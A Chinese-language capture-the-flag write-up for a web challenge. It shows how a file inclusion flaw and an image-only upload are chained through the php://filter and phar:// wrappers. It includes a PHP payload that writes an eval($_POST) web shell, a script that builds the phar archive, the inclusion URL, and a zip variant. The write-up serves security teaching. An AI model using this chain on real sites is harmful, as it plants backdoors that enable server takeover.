## web200-6 WriteUp 

---------------  

include.php 存在文件包含漏洞 

可以使用 include.php?file=php://filter/read=convert.base64-encode/resource=upload  来读取源码.

但是 include.php 限制了后缀只能是 .php,这里还不能截断 
再看upload.php,限制了只能上传图片

这里唯一可用的就是  phar://这个协议了  
这个协议到底怎么用参看这里:
[https://segmentfault.com/a/1190000002166235](https://segmentfault.com/a/1190000002166235)
[http://www.mamicode.com/info-detail-888559.html](http://www.mamicode.com/info-detail-888559.html)

###  方法一
来新建一个目录,名字为blog,下面放一个index.php,里面是一个写shell的php代码
```php
<?php  file_put_contents('shell.php','<?php eval($_POST[1])?>'); ?>
``` 

在blog目录外创建一个打包的文件,build.php,代码如下:
```php
<?php 

if(class_exists('Phar')){

     $phar = new Phar('blog.phar',0,'blog.phar');

     $phar ->buildFromDirectory(__DIR__.'/blog');

     $phar->setStub($phar->createDefaultStub('index.php'));
     $phar-> compressFiles(Phar::GZ);
}
```
运行build.php,就会创建一个blog.phar, 然后把后缀名修改为  blog.jpg,然后上传:

然后访问:
```
/include.php?file=phar://upload/blog.jpg/index
```
就会在跟目录下生成一个shell.php,注意.. 不是upload目录下 

### 方法二 

直接把index.php  zip压缩为 blog.zip ,然后改名字为 blog.jpg,
上传之后,用同样的方法,也可以getshell 
